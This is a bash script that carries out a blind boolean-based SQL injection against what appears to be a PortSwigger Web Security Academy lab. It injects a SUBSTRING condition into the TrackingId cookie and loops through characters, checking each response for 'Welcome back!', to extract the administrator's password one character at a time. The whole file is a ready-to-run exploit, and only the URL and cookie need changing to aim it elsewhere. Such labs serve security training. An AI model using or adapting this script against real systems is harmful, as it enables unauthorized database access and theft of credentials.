abc=$(echo {9..0} {a..z})
url="https://acd11f891f9b5cd4807e1274007b0036.web-security-academy.net/"
cookie='session=MkTPsv6qpbxMxOToys1Qo8ZfRf1m7Zm9; TrackingId=b1cP94KSXHI3etwO'
truestring="Welcome back!"
psw=""
echo -n "try "
for ((i=1;i<=20;i+=1))
do
	for j in $abc
	do
		echo -n "$j"
		curl -i -s -k -b "$cookie' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), $i, 1)='$j" $url | grep -o "$truestring" &> /dev/null
		if [ "$?" -eq 0 ] ;then
			psw=$psw$j
			echo -e "\nfound $j | pasword: $psw"
			break
		fi
		
	done
done
echo $psw
echo "finish"